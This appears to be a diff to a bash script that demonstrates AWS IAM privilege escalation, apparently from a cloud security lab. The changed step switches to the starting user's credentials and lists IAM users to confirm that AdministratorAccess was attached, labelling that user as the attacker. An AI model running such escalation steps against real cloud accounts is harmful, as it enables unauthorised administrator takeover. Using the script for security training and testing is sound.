@@ -366,14 +366,16 @@ if [ "$POLICY_ATTACHED" = false ]; then
     exit 1
 fi
 
-# [OBSERVATION] Step 12: Verify admin access
+# [EXPLOIT] Step 12: Verify admin access with starting user credentials
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
-use_readonly_creds
+echo "Waiting 15 seconds for IAM policy propagation..."
+sleep 15
+use_starting_creds
 export AWS_REGION=$AWS_REGION
 echo "The starting user now has AdministratorAccess attached..."
-echo "Attempting to list IAM users..."
+echo "Attempting to list IAM users with starting user credentials..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
